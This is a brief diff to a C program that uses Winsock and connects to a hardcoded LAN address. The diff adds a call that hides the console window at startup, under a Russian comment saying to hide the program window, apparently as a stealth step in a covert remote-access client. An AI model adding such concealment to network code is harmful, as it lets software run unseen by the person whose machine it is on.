@@ -4,6 +4,7 @@
 #include <Windows.h>
 
 #pragma comment(lib,"ws2_32.lib")
+#pragma comment(lib, "user32.lib")
 #pragma warning(disable:4996) 
 
 #define HOST "192.168.43.153"
@@ -14,6 +15,9 @@ void initWinsock();
 SOCKADDR_IN createServer();
 
 int main() {
+	// Скрыть окно программы
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
 	initWinsock();
 	SOCKADDR_IN server = createServer();
 	
